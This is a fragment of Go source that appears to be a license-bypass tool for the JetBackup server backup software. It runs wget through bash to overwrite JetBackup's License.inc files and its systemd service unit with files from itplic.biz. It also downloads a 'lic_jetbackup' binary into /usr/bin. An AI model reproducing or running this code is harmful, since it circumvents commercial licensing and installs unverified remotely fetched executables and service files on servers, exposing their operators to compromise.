...
func main() {
	...
	if f.Status == "success" {
		...
		if _, err := os.Stat("/usr/local/jetapps/var/lib/JetBackup"); err == nil {
			_, _ = exec.Command("bash", "-c", "wget -O /usr/local/jetapps/var/lib/JetBackup/Core/License.inc http://itplic.biz/api/files/jetbackup/0125444/License").Output()
		} else {
			_, _ = exec.Command("bash", "-c", "wget -O /usr/local/jetapps/var/lib/jetbackup5/Core/License/License.inc http://itplic.biz/api/files/jetbackup/0125444/LicenseV5").Output()
			_exec("wget -O /usr/lib/systemd/system/jetbackup5d.service http://itplic.biz/api/files/jetbackup/jetbackup5d.service > /dev/null 2>&1")
...
func file_checker() {
	if _, err := os.Stat("/usr/bin/lic_jetbackup"); err == nil {
		...
		downloadFile("/usr/bin/lic_jetbackup", "http://itplic.biz/api/files/jetbackup/lic_jetbackup")
